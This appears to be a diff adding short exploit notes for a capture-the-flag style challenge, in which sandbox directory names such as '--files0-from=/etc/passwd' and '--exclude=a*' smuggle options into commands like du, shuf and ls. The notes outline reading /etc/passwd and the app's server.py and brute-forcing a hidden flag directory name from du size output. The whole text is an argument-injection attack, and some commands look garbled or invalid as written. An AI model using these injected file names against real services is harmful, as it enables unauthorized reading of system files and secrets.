@@ -1,0 +1,30 @@
+Create
+	/sandbox/e4b29dbec6a9897467c1cc8ebdd782b5/--files0-from=
+	/sandbox/e4b29dbec6a9897467c1cc8ebdd782b5/--files0-from=/app
+	/sandbox/e4b29dbec6a9897467c1cc8ebdd782b5/--files0-from=/app/server.py
+
+	OR
+
+	-p /sandbox/d674a618fc3400f0f6aaba3cecfe7d53/--files0-from=/etc/passwd
+	
+
+Stat
+	--files0-from=/etc/passwd
+
+
+Bruteforce flag directory and name
+	# Add
+	ls --help -z /flag/ --output=/dev/shm/leo
+	# Next
+	# Shuffle (Write "/flag/" to /dev/shm/leo)
+	shuf -e -z /flag/ --output=/dev/shm/leo
+	# Create
+	mkdir -p /sandbox/<uid>/--files0-from=/dev/shm/leo
+
+	# Add
+	ls --help --output /sandbox/<uid>/--exclude=a*
+	# Next
+	# Shuffle (Create empty file "--exclude=a*")
+	
+	# Statistics (Output the size of "/flag/" exclude files and folders which meet the pattern)
+	du -sh 	--exclude=a* --files0-from=/dev/shm/leo
